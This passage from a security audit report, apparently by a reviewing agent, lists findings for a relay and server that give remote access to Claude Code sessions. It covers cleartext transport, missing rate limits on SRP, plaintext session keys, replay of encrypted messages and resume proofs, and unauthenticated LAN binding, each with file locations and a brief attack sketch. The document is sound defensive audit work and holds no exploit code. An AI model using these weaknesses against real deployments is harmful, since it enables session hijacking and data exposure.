- **Attack:** Plain HTTP server. Registration protocol (usernames, installIds) in cleartext. No enforcement of wss://.

#### Finding 3.2: /online/:username Enables User Enumeration [MEDIUM]
- **Component:** `packages/relay/src/server.ts:157-161`
- **Attack:** Unauthenticated, no rate limit. Enables presence tracking and targeted attacks.

#### Finding 3.3: No Rate Limiting on SRP Authentication [HIGH]
- **Component:** `packages/server/src/routes/ws-relay-handlers.ts:1026-1177`
- **Attack:** Unlimited SRP attempts. WebSocket stays open after failure. 8-char minimum password.

#### Finding 3.4: Session Keys Stored in Plaintext on Disk [HIGH]
- **Component:** `packages/server/src/remote-access/RemoteSessionService.ts:162-165, 400-403`
- **Attack:** Read file → extract key → impersonate session. Also enables offline dictionary attack on SRP verifier.

#### Finding 3.5: Any Client Can Connect to Any Registered Username Without Authentication [MEDIUM]
- **Component:** `packages/relay/src/connections.ts:94-119`, `packages/relay/src/ws-handler.ts:202-234`
- **Attack:** `client_connect` requires only a username. DoS by consuming server's waiting connection.

#### Finding 3.6: No Replay Protection on NaCl Encrypted Messages [MEDIUM]
- **Component:** NaCl wrapper (server and client)
- **Attack:** Capture and replay encrypted request messages. NaCl decryption succeeds on valid ciphertext.

#### Finding 3.7: Relay Operator Can Perform Traffic Analysis [MEDIUM]
- **Component:** Relay protocol
- **Attack:** Usernames, installIds, timing, message sizes, IP addresses visible. No PFS. Persistent correlation via SQLite.

#### Finding 3.8: WebSocket Origin Bypass via Null/Missing Origin [MEDIUM]
- **Component:** `packages/server/src/routes/ws-relay.ts:99-105`
- **Attack:** Non-browser clients connect without Origin. Local mode = immediate auth.

#### Finding 3.9: Network Binding to 0.0.0.0 Without Mandatory Authentication [CRITICAL]
- **Component:** `packages/server/src/index.ts:529-610`, `packages/server/src/routes/ws-relay.ts:204-207`
- **Attack:** Any LAN device gets full unauthenticated access to Claude Code sessions via WebSocket.

#### Finding 3.10: Session Resume Proof Replay Within 5 Minutes [HIGH]
- **Component:** `packages/server/src/remote-access/RemoteSessionService.ts:211-249`
- **Attack:** Capture resume proof via relay → replay within 5 minutes → hijack session.

#### Finding 3.11: Relay Server CORS origin: "*" [LOW]
- **Component:** `packages/relay/src/server.ts:125-132`
- **Attack:** Any website can query relay endpoints.

#### Finding 3.12: SRP Verifier Enables Offline Dictionary Attack [MEDIUM]
- **Component:** `packages/server/src/remote-access/RemoteAccessService.ts:30-38`
- **Attack:** Salt + verifier in plaintext file. SRP KDF not as slow as bcrypt/argon2.

#### Finding 3.13: WebSocket Message Queue No Memory Limit [LOW]
- **Component:** `packages/server/src/routes/ws-relay.ts:181, 211-225`
- **Attack:** Flood WebSocket faster than server processes. No backpressure.

#### Finding 3.14: Maintenance Server No Authentication [LOW]
- **Component:** `packages/server/src/index.ts:663-670`
- **Attack:** Local process can trigger reload/inspector. HIGH if accidentally exposed.

#### Finding 3.15: No Perfect Forward Secrecy [MEDIUM]
- **Component:** SecureConnection, RemoteSessionService
- **Attack:** Compromised session key → decrypt all messages from up to 30-day session.

#### Finding 3.16: installId Sent in Plaintext to Relay [LOW]
- **Component:** `packages/server/src/services/RelayClientService.ts:230-235`
- **Attack:** Stable identifier enables cross-username correlation by relay operator.

#### Positive Findings (Agent 3)
- E2E encryption (SRP + NaCl) provides strong protection against relay compromise ✓
- Relay is a dumb pipe — cannot read encrypted content ✓
- Binary envelope format with authenticated format byte ✓
- Session expiration with idle + max lifetime ✓
- Default binding to localhost (127.0.0.1) ✓
- SRP mutual verification (M1, M2) prevents MITM ✓
